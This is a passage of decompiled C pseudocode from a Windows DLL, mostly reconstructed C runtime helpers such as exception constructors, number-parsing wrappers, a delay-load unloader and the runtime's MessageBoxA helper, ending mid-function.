// 10000002: using guessed type __int16 word_10000002;
// 100BC8DC: using guessed type int dword_100BC8DC;
// 100BC8E0: using guessed type int (__stdcall *dword_100BC8E0)(_DWORD, _DWORD);
// 100BC8E4: using guessed type int (__stdcall *dword_100BC8E4)(_DWORD, _DWORD);

//----- (1004C785) --------------------------------------------------------
int *__thiscall sub_1004C785(int *hMem, char a2)
{
  sub_1004C465(hMem);
  if ( (a2 & 1) != 0 )
    LocalFree(hMem);
  return hMem;
}

//----- (1004C7A3) --------------------------------------------------------
int __stdcall sub_1004C7A3(char *a1)
{
  int *i; // esi
  _BYTE *v2; // ecx
  int v3; // edi
  int v4; // eax
  int *v5; // edi
  int *v6; // ebx
  int v8; // [esp+0h] [ebp-4h]

  v8 = -2147024770;
  if ( *(_DWORD *)&byte_10000040[(_DWORD)off_1000003C + 164] )
  {
    for ( i = (int *)((char *)&_ImageBase + *(_DWORD *)&byte_10000040[(_DWORD)off_1000003C + 160]); ; i += 8 )
    {
      v4 = i[1];
      if ( !v4 )
        break;
      v2 = (char *)&_ImageBase + v4;
      v3 = strlen((const char *)&_ImageBase + v4);
      if ( v3 == strlen(a1) && !sub_1004C3EA(a1, v2, v3) )
        break;
    }
    if ( i[1] )
    {
      v5 = (int *)((char *)&_ImageBase + i[3]);
      v6 = &v5[sub_1004C43A(v5)];
      while ( v5 < v6 )
        sub_1004C548(i, v5++);
      return 0;
    }
  }
  return v8;
}
// 10000000: using guessed type __int16 _ImageBase;
// 1000003C: using guessed type int *off_1000003C;

//----- (1004C83F) --------------------------------------------------------
int __stdcall sub_1004C83F(char *hLibModule)
{
  int *v1; // esi
  char *v2; // ecx
  int v3; // eax
  _DWORD *v4; // eax
  HMODULE *v5; // esi
  _DWORD *v6; // ebx
  int v7; // eax
  char *v8; // ecx
  _BYTE *v9; // edi
  int v11; // [esp+4h] [ebp-8h]
  int *v12; // [esp+8h] [ebp-4h]
  HMODULE hLibModulea; // [esp+14h] [ebp+8h]

  v11 = 0;
  v1 = (int *)dword_100BC8DC;
  v12 = (int *)dword_100BC8DC;
  if ( dword_100BC8DC )
  {
    do
    {
      v2 = (char *)&_ImageBase + *(_DWORD *)(v1[1] + 4);
      v3 = strlen(v2);
      if ( v3 == strlen(hLibModule) && !sub_1004C3EA(hLibModule, v2, v3) )
        break;
      v1 = (int *)*v1;
      v12 = v1;
    }
    while ( v1 );
    if ( v1 )
    {
      v4 = (_DWORD *)v1[1];
      if ( v4[6] )
      {
        v5 = (HMODULE *)((char *)&_ImageBase + v4[2]);
        v6 = (_DWORD *)((char *)&_ImageBase + v4[3]);
        hLibModulea = *v5;
        v7 = 4 * sub_1004C43A(v6);
        v8 = (char *)&_ImageBase + *(_DWORD *)(v12[1] + 24);
        v9 = v6;
        while ( v7 )
        {
          --v7;
          *v9++ = *v8++;
        }
        FreeLibrary(hLibModulea);
        *v5 = 0;
        sub_1004C785(v12, 1);
        return 1;
      }
    }
  }
  return v11;
}
// 10000000: using guessed type __int16 _ImageBase;
// 100BC8DC: using guessed type int dword_100BC8DC;

//----- (1004CB83) --------------------------------------------------------
void __thiscall sub_1004CB83(void *this)
{
  *(_DWORD *)this = &ikc::izq_ezibc::`vftable';
  sub_10053658(this);
}
// 1008DB44: using guessed type void *ikc::izq_ezibc::`vftable';

//----- (1004CB8E) --------------------------------------------------------
_DWORD *__thiscall sub_1004CB8E(_DWORD *Block, char a2)
{
  *Block = &ikc::izq_ezibc::`vftable';
  sub_10053658(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1008DB44: using guessed type void *ikc::izq_ezibc::`vftable';

//----- (1004CBB0) --------------------------------------------------------
std::exception *__thiscall sub_1004CBB0(std::exception *this, const struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &ikc::izq_ezibc::`vftable';
  return this;
}
// 100535AA: using guessed type _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1008DB44: using guessed type void *ikc::izq_ezibc::`vftable';

//----- (1004CCA6) --------------------------------------------------------
void __thiscall sub_1004CCA6(struct type_info *this)
{
  *(_DWORD *)this = &nxys_uwip::`vftable';
  type_info::_Type_info_dtor(this);
}
// 100537B0: using guessed type void __cdecl type_info::_Type_info_dtor(struct type_info *);
// 1008DB50: using guessed type void *nxys_uwip::`vftable';

//----- (1004CCB4) --------------------------------------------------------
struct type_info *__thiscall sub_1004CCB4(struct type_info *Block, char a2)
{
  sub_1004CCA6(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004CD3D) --------------------------------------------------------
char *__thiscall sub_1004CD3D(char *this)
{
  return this + 8;
}

//----- (1004D79B) --------------------------------------------------------
errno_t __cdecl sub_1004D79B(wchar_t *String, size_t Size)
{
  return _wcsupr_s_l(String, Size, 0);
}

//----- (1004DA6C) --------------------------------------------------------
void __thiscall sub_1004DA6C(void *this)
{
  if ( this != (void *)dword_100B5090 )
    __report_gsfailure();
}
// 100B5090: using guessed type int dword_100B5090;

//----- (1004E709) --------------------------------------------------------
unsigned int __cdecl sub_1004E709(const wchar_t *a1, const wchar_t **a2, int a3, struct localeinfo_struct *a4)
{
  return wcstoxl(a4, a1, a2, a3, 0);
}
// 1004E4E9: using guessed type unsigned int __cdecl wcstoxl(struct localeinfo_struct *, const wchar_t *, const wchar_t **, _DWORD, _DWORD);

//----- (1004E8CF) --------------------------------------------------------
int __cdecl sub_1004E8CF(int a1)
{
  int result; // eax

  result = a1;
  dword_100BC90C = a1;
  return result;
}
// 100BC90C: using guessed type int dword_100BC90C;

//----- (10051B60) --------------------------------------------------------
wint_t __cdecl sub_10051B60(wint_t C)
{
  return _towupper_l(C, 0);
}

//----- (10051B73) --------------------------------------------------------
int __cdecl sub_10051B73(wchar_t *String)
{
  return wcstol(String, 0, 10);
}

//----- (1005255C) --------------------------------------------------------
int sub_1005255C()
{
  return dword_100B50A8;
}
// 100B50A8: using guessed type int dword_100B50A8;

//----- (10052D0E) --------------------------------------------------------
int __cdecl sub_10052D0E(_DWORD *a1)
{
  if ( a1 && dword_100BC934 )
  {
    *a1 = dword_100BC934;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 10056193: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100BC934: using guessed type int dword_100BC934;

//----- (10052DBD) --------------------------------------------------------
int __cdecl sub_10052DBD(_DWORD *a1)
{
  if ( a1 && dword_100BC934 )
  {
    *a1 = dword_100BC940;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 10056193: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100BC934: using guessed type int dword_100BC934;
// 100BC940: using guessed type int dword_100BC940;

//----- (10053529) --------------------------------------------------------
int __cdecl sub_10053529(int a1)
{
  int result; // eax

  result = a1;
  dword_100BCC94 = a1;
  return result;
}
// 100BCC94: using guessed type int dword_100BCC94;

//----- (10053658) --------------------------------------------------------
void __thiscall sub_10053658(void *this)
{
  bool v1; // zf

  v1 = *((_DWORD *)this + 2) == 0;
  *(_DWORD *)this = &ikc::qlurhxmnb::`vftable';
  if ( !v1 )
    free(*((void **)this + 1));
}
// 1008E1E0: using guessed type void *ikc::qlurhxmnb::`vftable';

//----- (100536B7) --------------------------------------------------------
std::exception *__thiscall sub_100536B7(std::exception *this, const char *const a2)
{
  std::exception::exception(this, &a2);
  *(_DWORD *)this = &ikc::zji_ljuxnx::`vftable';
  return this;
}
// 10053544: using guessed type _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const char *const *);
// 1008E20C: using guessed type void *ikc::zji_ljuxnx::`vftable';

//----- (100536D0) --------------------------------------------------------
std::exception *__thiscall sub_100536D0(std::exception *this, const struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &ikc::zji_ljuxnx::`vftable';
  return this;
}
// 100535AA: using guessed type _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1008E20C: using guessed type void *ikc::zji_ljuxnx::`vftable';

//----- (1005372E) --------------------------------------------------------
void *__thiscall sub_1005372E(void *Block, char a2)
{
  sub_10053658(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1005374A) --------------------------------------------------------
_DWORD *__thiscall sub_1005374A(_DWORD *Block, char a2)
{
  *Block = &ikc::sjn_wxme::`vftable';
  sub_10053658(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1008E200: using guessed type void *ikc::sjn_wxme::`vftable';

//----- (1005376C) --------------------------------------------------------
_DWORD *__thiscall sub_1005376C(_DWORD *Block, char a2)
{
  *Block = &ikc::zji_ljuxnx::`vftable';
  sub_10053658(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1008E20C: using guessed type void *ikc::zji_ljuxnx::`vftable';

//----- (1005378E) --------------------------------------------------------
_DWORD *__thiscall sub_1005378E(_DWORD *Block, char a2)
{
  *Block = &ikc::zji_ljuxnx::`vftable';
  sub_10053658(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1008E20C: using guessed type void *ikc::zji_ljuxnx::`vftable';

//----- (1005438D) --------------------------------------------------------
void *sub_1005438D()
{
  return &unk_1009627C;
}

//----- (100543B1) --------------------------------------------------------
void __cdecl sub_100543B1()
{
  ;
}

//----- (10055354) --------------------------------------------------------
int sub_10055354()
{
  return 0;
}

//----- (10056055) --------------------------------------------------------
int __cdecl sub_10056055(int a1)
{
  int result; // eax

  result = a1;
  dword_100BCDF0 = a1;
  return result;
}
// 100BCDF0: using guessed type int dword_100BCDF0;

//----- (1005A6ED) --------------------------------------------------------
unsigned __int64 __cdecl sub_1005A6ED(const wchar_t *a1, const wchar_t **a2, int a3, struct localeinfo_struct *a4)
{
  return wcstoxq(a4, a1, a2, a3, 0);
}
// 1005A414: using guessed type unsigned __int64 __cdecl wcstoxq(struct localeinfo_struct *, const wchar_t *, const wchar_t **, _DWORD, _DWORD);

//----- (1005A8F4) --------------------------------------------------------
void __thiscall sub_1005A8F4(void *this)
{
  *(_DWORD *)this = &ikc::rnp_nhgjjqmxr::`vftable';
  sub_10053658(this);
}
// 1008E358: using guessed type void *ikc::rnp_nhgjjqmxr::`vftable';

//----- (1005A8FF) --------------------------------------------------------
_DWORD *__thiscall sub_1005A8FF(_DWORD *Block, char a2)
{
  *Block = &ikc::rnp_nhgjjqmxr::`vftable';
  sub_10053658(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1008E358: using guessed type void *ikc::rnp_nhgjjqmxr::`vftable';

//----- (1005B998) --------------------------------------------------------
std::exception *__thiscall sub_1005B998(std::exception *this, const struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &ikc::rnp_nhgjjqmxr::`vftable';
  return this;
}
// 100535AA: using guessed type _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1008E358: using guessed type void *ikc::rnp_nhgjjqmxr::`vftable';

//----- (1005CB7C) --------------------------------------------------------
int sub_1005CB7C()
{
  return _decode_pointer(dword_100BD27C);
}
// 100524D0: using guessed type _DWORD __cdecl _decode_pointer(_DWORD);
// 100BD27C: using guessed type int dword_100BD27C;

//----- (1005CF88) --------------------------------------------------------
LONG __cdecl sub_1005CF88(LONG a1)
{
  LONG result; // eax

  result = a1;
  Target = a1;
  return result;
}

//----- (1005D096) --------------------------------------------------------
int __cdecl sub_1005D096(int a1)
{
  int result; // eax

  result = a1;
  dword_100BD28C = a1;
  return result;
}
// 100BD28C: using guessed type int dword_100BD28C;

//----- (1005D175) --------------------------------------------------------
int __cdecl sub_1005D175(int a1, int a2, int a3)
{
  HMODULE LibraryA; // eax
  HMODULE v4; // edi
  int (__stdcall *MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT); // eax
  HWND (__stdcall *GetActiveWindow)(); // eax
  HWND (__stdcall *GetLastActivePopup)(HWND); // eax
  BOOL (__stdcall *GetUserObjectInformationA)(HANDLE, int, PVOID, DWORD, LPDWORD); // eax
  HWINSTA (__stdcall *GetProcessWindowStation)(); // eax
  int (*v10)(void); // esi
  int (__stdcall *v11)(int, int, char *, int, char *); // eax
  int (__stdcall *v12)(int, int, char *, int, char *); // edi
  int v13; // eax
  int (*v14)(void); // eax
  int (__stdcall *v15)(int); // eax
  int (__stdcall *v16)(int, int, int, int); // eax
  char v18[12]; // [esp+10h] [ebp-20h] BYREF
  char v19[4]; // [esp+1Ch] [ebp-14h] BYREF
  unsigned int v20; // [esp+20h] [ebp-10h] BYREF
  int v21; // [esp+24h] [ebp-Ch] BYREF
  int v22; // [esp+28h] [ebp-8h]
  int v23; // [esp+2Ch] [ebp-4h]

  v22 = _encoded_null();
  v23 = 0;
  v21 = 0;
  v20 = 0;
  if ( !dword_100BD290 )
  {
    LibraryA = LoadLibraryA("USER32.DLL");
    v4 = LibraryA;
    if ( !LibraryA )
      return 0;
    MessageBoxA = (int (__stdcall *)(HWND, LPCSTR, LPCSTR, UINT))GetProcAddress(LibraryA, "MessageBoxA");
    if ( !MessageBoxA )
      return 0;
    dword_100BD290 = _encode_pointer(MessageBoxA);
    GetActiveWindow = (HWND (__stdcall *)())GetProcAddress(v4, "GetActiveWindow");
    dword_100BD294 = _encode_pointer(GetActiveWindow);
    GetLastActivePopup = (HWND (__stdcall *)(HWND))GetProcAddress(v4, "GetLastActivePopup");
    dword_100BD298 = _encode_pointer(GetLastActivePopup);
    if ( sub_10052D0E(&v21) )
      _invoke_watson(0, 0, 0, 0, 0);
    if ( v21 == 2 )
    {
      GetUserObjectInformationA = (BOOL (__stdcall *)(HANDLE, int, PVOID, DWORD, LPDWORD))GetProcAddress(
                                                                                            v4,
                                                                                            "GetUserObjectInformationA");
      dword_100BD2A0 = _encode_pointer(GetUserObjectInformationA);
      if ( dword_100BD2A0 )
      {
        GetProcessWindowStation = (HWINSTA (__stdcall *)())GetProcAddress(v4, "GetProcessWindowStation");
        dword_100BD29C = _encode_pointer(GetProcessWindowStation);
      }
    }
  }
  if ( dword_100BD29C == v22
    || dword_100BD2A0 == v22
    || (v10 = (int (*)(void))_decode_pointer(dword_100BD29C),
        v11 = (int (__stdcall *)(int, int, char *, int, char *))_decode_pointer(dword_100BD2A0),
        v12 = v11,
        !v10)
    || !v11
    || (v13 = v10()) != 0 && v12(v13, 1, v18, 12, v19) && (v18[8] & 1) != 0 )
  {
    if ( dword_100BD294 != v22 )
    {
      v14 = (int (*)(void))_decode_pointer(dword_100BD294);
      if ( v14 )
      {
        v23 = v14();
        if ( v23 )
        {
          if ( dword_100BD298 != v22 )
          {
            v15 = (int (__stdcall *)(int))_decode_pointer(dword_100BD298);
            if ( v15 )
              v23 = v15(v23);
          }
        }
      }
    }
  }
  else
  {
    if ( sub_10052DBD(&v20) )
      _invoke_watson(0, 0, 0, 0, 0);
    if ( v20 < 4 )
      a3 |= 0x40000u;
    else
      a3 |= 0x200000u;
  }
  v16 = (int (__stdcall *)(int, int, int, int))_decode_pointer(dword_100BD290);
  if ( v16 )
    return v16(v23, a1, a2, a3);
  return 0;
}
// 10052459: using guessed type _DWORD __cdecl _encode_pointer(_DWORD);
// 100524C7: using guessed type int _encoded_null(void);
// 100524D0: using guessed type _DWORD __cdecl _decode_pointer(_DWORD);
// 100BD290: using guessed type int dword_100BD290;
// 100BD294: using guessed type int dword_100BD294;
// 100BD298: using guessed type int dword_100BD298;
// 100BD29C: using guessed type int dword_100BD29C;
// 100BD2A0: using guessed type int dword_100BD2A0;
// 1005D175: using guessed type char var_14[4];

//----- (1005E690) --------------------------------------------------------
int sub_1005E690()
{
  return 1;
}

//----- (1005E694) --------------------------------------------------------
char __thiscall sub_1005E694(_BYTE *this)
{
  return this[8];
}

//----- (1005E6B3) --------------------------------------------------------
int __thiscall sub_1005E6B3(_DWORD *this)
{
  return this[3];
}

//----- (1005E70B) --------------------------------------------------------
int __thiscall sub_1005E70B(_DWORD *this)
{
  return this[3];
}

//----- (10063229) --------------------------------------------------------
int sub_10063229()
{
  dword_100C0C04 = _get_sse2_info();
  return 0;
}
// 100631C9: using guessed type int _get_sse2_info(void);
// 100C0C04: using guessed type int dword_100C0C04;

//----- (10064AD3) --------------------------------------------------------
int sub_10064AD3()
{
  return 0;
}

//----- (10066480) --------------------------------------------------------
void sub_10066480()
{
  dword_100C0AC4 = 0;
}
// 100C0AC4: using guessed type int dword_100C0AC4;

//----- (10066F61) --------------------------------------------------------
void **sub_10066F61()
{
  return &off_100B5D40;
}
// 100B5D40: using guessed type void *off_100B5D40;

//----- (10067E69) --------------------------------------------------------
int sub_10067E69()
{
  void **v0; // eax

  v0 = sub_10066F61();
  return _unlock_file2(1, v0 + 8);
}
// 100670D8: using guessed type _DWORD __cdecl _unlock_file2(_DWORD, _DWORD);

//----- (1006A5A7) --------------------------------------------------------
void sub_1006A5A7()
{
  ;
}

//----- (1006A5B6) --------------------------------------------------------
void sub_1006A5B6()
{
  ;
}

//----- (1006A763) --------------------------------------------------------
int __cdecl sub_1006A763(_DWORD *a1, int a2, struct localeinfo_struct *a3)
{
  int v3; // eax
  char v6[4]; // [esp+Ch] [ebp-28h] BYREF
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-1Ch]
  char v9; // [esp+1Ch] [ebp-18h]
  int v10; // [esp+20h] [ebp-14h]
  unsigned __int16 v11[6]; // [esp+24h] [ebp-10h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v7, a3);
  v10 = __strgtold12_l(v11, v6, a2, 0, 0, 0, 0, v7);
  v3 = sub_1006E7B9(v11, a1);
  if ( (v10 & 3) != 0 )
  {
    if ( (v10 & 1) != 0 )
      goto LABEL_8;
    if ( (v10 & 2) != 0 )
      goto LABEL_3;
  }
  else
  {
    if ( v3 == 1 )
    {
LABEL_3:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 3;
    }
    if ( v3 == 2 )
    {
LABEL_8:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 4;
    }
  }
  if ( v9 )
    *(_DWORD *)(v8 + 112) &= ~2u;
  return 0;
}
// 1004D0FC: using guessed type _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct localeinfo_struct *);
// 1006F8D7: using guessed type _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1006A763: using guessed type char var_28[4];
// 1006A763: using guessed type unsigned __int16 var_10[6];

//----- (1006A8D6) --------------------------------------------------------
int __cdecl sub_1006A8D6(_DWORD *a1, int a2, struct localeinfo_struct *a3)
{
  int v3; // eax
  char v6[4]; // [esp+Ch] [ebp-28h] BYREF
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-1Ch]
  char v9; // [esp+1Ch] [ebp-18h]
  int v10; // [esp+20h] [ebp-14h]
  unsigned __int16 v11[6]; // [esp+24h] [ebp-10h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v7, a3);
  v10 = __strgtold12_l(v11, v6, a2, 0, 0, 0, 0, v7);
  v3 = sub_1006ECFB(v11, a1);
  if ( (v10 & 3) != 0 )
  {
    if ( (v10 & 1) != 0 )
      goto LABEL_8;
    if ( (v10 & 2) != 0 )
      goto LABEL_3;
  }
  else
  {
    if ( v3 == 1 )
    {
LABEL_3:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 3;
    }
    if ( v3 == 2 )
    {
LABEL_8:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 4;
    }
  }
  if ( v9 )
    *(_DWORD *)(v8 + 112) &= ~2u;
  return 0;
}
// 1004D0FC: using guessed type _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct localeinfo_struct *);
// 1006F8D7: using guessed type _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1006A8D6: using guessed type char var_28[4];
// 1006A8D6: using guessed type unsigned __int16 var_10[6];

//----- (1006AE8D) --------------------------------------------------------
int __cdecl sub_1006AE8D(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_100B5FE4;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 10056193: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100B5FE4: using guessed type int dword_100B5FE4;

//----- (1006AEC1) --------------------------------------------------------
int __cdecl sub_1006AEC1(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_100B5FE8;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 10056193: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100B5FE8: using guessed type int dword_100B5FE8;

//----- (1006AEF5) --------------------------------------------------------
int __cdecl sub_1006AEF5(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_100B5FE0;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 10056193: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100B5FE0: using guessed type int dword_100B5FE0;

//----- (1006AFCB) --------------------------------------------------------
int *sub_1006AFCB()
{
  return &dword_100B5FE4;
}
// 100B5FE4: using guessed type int dword_100B5FE4;

//----- (1006AFD1) --------------------------------------------------------
int *sub_1006AFD1()
{
  return &dword_100B5FE8;
}
// 100B5FE8: using guessed type int dword_100B5FE8;

//----- (1006AFD7) --------------------------------------------------------
int *sub_1006AFD7()
{
  return &dword_100B5FE0;
}
// 100B5FE0: using guessed type int dword_100B5FE0;

//----- (1006AFDD) --------------------------------------------------------
void **sub_1006AFDD()
{
  return &off_100B6070;
}
// 100B6070: using guessed type void *off_100B6070;

//----- (1006C364) --------------------------------------------------------
int sub_1006C364()
{
  return _unlock(3);
}
// 100591B6: using guessed type _DWORD __cdecl _unlock(_DWORD);

//----- (1006C5DD) --------------------------------------------------------
int sub_1006C5DD()
{
  return flsall(1);
}
// 1006C4B0: using guessed type _DWORD __cdecl flsall(_DWORD);

//----- (1006CAA4) --------------------------------------------------------
int __cdecl sub_1006CAA4(int a1, int a2, int a3)
{
  return vprintf_helper(_output_l, a1, a2, a3);
}
// 10067439: using guessed type int __cdecl _output_l(int, int, int, int);
// 1006CA14: using guessed type _DWORD __cdecl vprintf_helper(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (1006CABE) --------------------------------------------------------
int __cdecl sub_1006CABE(int a1, int a2, int a3)
{
  return vprintf_helper(_output_s_l, a1, a2, a3);
}
// 100683F6: using guessed type int __cdecl _output_s_l(int, int, int, int);
// 1006CA14: using guessed type _DWORD __cdecl vprintf_helper(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (1006CAD8) --------------------------------------------------------
int __cdecl sub_1006CAD8(int a1, int a2, int a3)
{
  return vprintf_helper(_output_p_l, a1, a2, a3);
}
// 1006CA14: using guessed type _DWORD __cdecl vprintf_helper(_DWORD, _DWORD, _DWORD, _DWORD);
// 1006CDBE: using guessed type int __cdecl _output_p_l(FILE *Stream, int, int, int);

//----- (1006DF9A) --------------------------------------------------------
unsigned int __cdecl sub_1006DF9A(const char *a1, const char **a2, int a3, struct localeinfo_struct *a4)
{
  return strtoxl(a4, a1, a2, a3, 0);
}
// 1006DD46: using guessed type unsigned int __cdecl strtoxl(struct localeinfo_struct *, const char *, const char **, _DWORD, _DWORD);

//----- (1006E7B9) --------------------------------------------------------
int __cdecl sub_1006E7B9(unsigned __int16 *a1, _DWORD *a2)
{
  unsigned __int16 v2; // bx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int result; // eax
  int v8; // esi
  int *v9; // edi
  int v10; // eax
  bool i; // zf
  int v12; // eax
  unsigned int v13; // edx
  int *v14; // ecx
  bool v15; // cf
  unsigned int v16; // esi
  int v17; // eax
  int v18; // edx
  int *v19; // ebx
  unsigned int v20; // esi
  char v21; // cl
  int v22; // edx
  int *v23; // ecx
  int v24; // esi
  int v25; // eax
  int *v26; // ebx
  bool j; // zf
  int v28; // eax
  unsigned int v29; // edx
  int *v30; // ecx
  unsigned int v31; // edi
  int k; // ecx
  int *v33; // ecx
  unsigned int v34; // esi
  int v35; // edi
  int v36; // eax
  int v37; // edx
  int *v38; // ebx
  unsigned int v39; // esi
  char v40; // cl
  int v41; // edx
  int *v42; // ecx
  int v43; // eax
  int v44; // edx
  int *v45; // ebx
  unsigned int v46; // esi
  char v47; // cl
  int v48; // edx
  int *v49; // ecx
  int v50; // eax
  int v51; // edx
  unsigned int v52; // edi
  int v53; // edx
  int *v54; // ecx
  unsigned int v55; // ebx
  int v56; // edx
  int v57; // [esp+8h] [ebp-2Ch]
  int v58; // [esp+Ch] [ebp-28h]
  int v59; // [esp+10h] [ebp-24h]
  int v60; // [esp+14h] [ebp-20h] BYREF
  int v61; // [esp+18h] [ebp-1Ch]
  int v62; // [esp+1Ch] [ebp-18h] BYREF
  int v63; // [esp+20h] [ebp-14h]
  int v64; // [esp+24h] [ebp-10h]
  int v65; // [esp+28h] [ebp-Ch]
  int v66; // [esp+2Ch] [ebp-8h]
  int v67; // [esp+30h] [ebp-4h]
  int v68; // [esp+3Ch] [ebp+8h]
  unsigned int v69; // [esp+3Ch] [ebp+8h]
  int v70; // [esp+3Ch] [ebp+8h]
  int v71; // [esp+3Ch] [ebp+8h]
  int v72; // [esp+3Ch] [ebp+8h]
  int v73; // [esp+3Ch] [ebp+8h]
  int v74; // [esp+3Ch] [ebp+8h]

  v2 = a1[5];
  v63 = v2 & 0x8000;
  v60 = *(_DWORD *)(a1 + 3);
  v3 = (v2 & 0x7FFF) - 0x3FFF;
  v4 = *a1 << 16;
  v61 = *(_DWORD *)(a1 + 1);
  v62 = v4;
  if ( v3 != -16383 )
  {
    v68 = 0;
    v57 = v60;
    v58 = v61;
    v59 = v62;
    v8 = dword_100B609C - 1;
    v64 = v3;
    v65 = dword_100B609C / 32;
    v9 = &v60 + dword_100B609C / 32;
    v66 = 31 - dword_100B609C % 32;
    if ( ((1 << (31 - dword_100B609C % 32)) & *v9) != 0 )
    {
      v10 = v65;
      for ( i = (~(-1 << (31 - dword_100B609C % 32)) & *(&v60 + v65)) == 0; i; i = *(&v60 + v10) == 0 )
      {
        if ( ++v10 >= 3 )
          goto LABEL_22;
      }
      v12 = v8 / 32;
      v67 = 0;
      v13 = 1 << (31 - v8 % 32);
      v14 = &v60 + v8 / 32;
      v69 = v13 + *v14;
      if ( v69 >= *v14 )
      {
        v15 = v69 < v13;
        goto LABEL_18;
      }
LABEL_19:
      v67 = 1;
      while ( 1 )
      {
        --v12;
        *v14 = v69;
        if ( v12 < 0 || !v67 )
          break;
        v67 = 0;
        v14 = &v60 + v12;
        v16 = *v14 + 1;
        v69 = v16;
        if ( v16 >= *v14 )
        {
          v15 = v16 == 0;
LABEL_18:
          if ( !v15 )
            continue;
        }
        goto LABEL_19;
      }
      v68 = v67;
    }
LABEL_22:
    *v9 &= -1 << v66;
    if ( v65 + 1 < 3 )
      memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
    if ( v68 )
      ++v3;
    if ( v3 >= dword_100B6098 - dword_100B609C )
    {
      if ( v3 > dword_100B6098 )
      {
        if ( v3 < dword_100B6094 )
        {
          v60 &= ~0x80000000;
          v5 = dword_100B60A8 + v3;
          v50 = dword_100B60A0 / 32;
          v51 = dword_100B60A0 % 32;
          v65 = 0;
          v74 = 0;
          v67 = 32 - dword_100B60A0 % 32;
          do
          {
            v52 = *(&v60 + v74);
            v64 = ~(-1 << v51) & v52;
            *(&v60 + v74++) = v65 | (v52 >> v51);
            v65 = v64 << v67;
          }
          while ( v74 < 3 );
          v53 = 2;
          v54 = &v62 - v50;
          do
          {
            if ( v53 < v50 )
              *(&v60 + v53) = 0;
            else
              *(&v60 + v53) = *v54;
            --v53;
            --v54;
          }
          while ( v53 >= 0 );
          result = 0;
        }
        else
        {
          v61 = 0;
          v62 = 0;
          v60 = 0x80000000;
          v43 = dword_100B60A0 / 32;
          v44 = dword_100B60A0 % 32;
          v65 = 0;
          v73 = 0;
          v67 = 32 - dword_100B60A0 % 32;
          do
          {
            v45 = &v60 + v73;
            v46 = *v45;
            v64 = ~(-1 << v44) & *v45;
            v47 = v67;
            *v45 = v65 | (v46 >> v44);
            ++v73;
            v65 = v64 << v47;
          }
          while ( v73 < 3 );
          v48 = 2;
          v49 = &v62 - v43;
          do
          {
            if ( v48 < v43 )
              *(&v60 + v48) = 0;
            else
              *(&v60 + v48) = *v49;
            --v48;
            --v49;
          }
          while ( v48 >= 0 );
          v5 = dword_100B60A8 + dword_100B6094;
          result = 1;
        }
        goto LABEL_79;
      }
      v60 = v57;
      v61 = v58;
      v17 = (dword_100B6098 - v64) / 32;
      v62 = v59;
      v18 = (dword_100B6098 - v64) % 32;
      v65 = 0;
      v70 = 0;
      v67 = 32 - v18;
      do
      {
        v19 = &v60 + v70;
        v20 = *v19;
        v64 = ~(-1 << v18) & *v19;
        v21 = v67;
        *v19 = v65 | (v20 >> v18);
        ++v70;
        v65 = v64 << v21;
      }
